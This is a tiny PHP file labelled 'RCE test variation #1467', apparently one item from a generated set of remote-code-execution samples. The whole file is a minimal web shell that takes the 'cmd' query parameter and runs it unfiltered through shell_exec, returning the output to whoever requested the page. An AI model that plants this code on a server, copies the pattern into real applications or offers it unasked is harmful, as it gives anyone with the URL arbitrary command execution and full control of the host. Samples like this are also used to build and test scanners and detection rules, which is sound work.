<?php
// RCE test variation #1467
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>